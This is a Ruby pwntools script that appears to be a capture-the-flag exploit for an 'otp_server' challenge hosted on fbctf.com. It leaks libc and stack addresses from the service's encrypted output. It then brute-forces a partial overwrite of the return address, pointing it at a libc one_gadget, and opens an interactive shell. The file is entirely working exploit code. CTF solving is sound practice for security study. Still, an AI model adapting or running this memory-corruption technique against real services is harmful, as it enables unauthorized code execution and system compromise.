#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

host, port = 'challenges.fbctf.com', 1338
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'otp_server'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt; z.gets '>>> '; end

def set_key(key)
  pt
  z.write "1\x00\x00\x00"
  z.write key
end

def enc(msg)
  pt
  z.write "2\x00\x00\x00"
  z.write msg
  z.gets "----- BEGIN ROP ENCRYPTED MESSAGE -----\n"
end

set_key("\x01" * 64)
enc("\x40" * 256)

data = z.gets("----- END ROP ENCRYPTED MESSAGE -----", drop: true)
libc = ELF.new('../libc-2.27.so')
libc.address = data[280, 8].u64 - 0x21b97
log.dump libc.address.hex
h.offset(libc.address)

stack = data[296, 8].u64
log.dump stack.hex

# set_key + enc until we change the ret addr to one_gadget
target = libc.one_gadgets[1].p64[0, 3]
3.times do |i|
  t = target[2-i].ord
  log.info "Trying #{i}: #{t.hex}.."
  # STDIN.gets
  loop do
    set_key("\x10" * (272 - 256 + (3-i)) + "\x00")
    enc("\x40" * 256)
    chr = z.readn(4)[-1].ord ^ 0x10
    break if chr == t
  end
end
z.interact

# overfloat/overfloat.rb
